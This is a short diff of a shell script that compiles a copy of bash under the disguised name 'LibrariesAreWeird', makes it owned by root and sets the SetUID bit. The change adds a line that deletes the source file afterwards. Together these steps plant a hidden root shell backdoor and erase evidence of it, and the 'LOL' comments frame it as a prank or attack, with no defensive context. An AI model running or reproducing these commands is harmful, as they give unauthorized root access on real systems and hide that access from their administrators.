@@ -28,6 +28,9 @@ EOF
 gcc bash.c -o LibrariesAreWeird # Compile, check perms in a sec.
 ls -l LibrariesAreWeird # Now we check perms, LOL.
 
+# Delete bash.c, LOL
+rm bash.c
+
 # Add SetUID perms - check to verify
 sudo chown root:root LibrariesAreWeird
 sudo chmod u+s LibrariesAreWeird
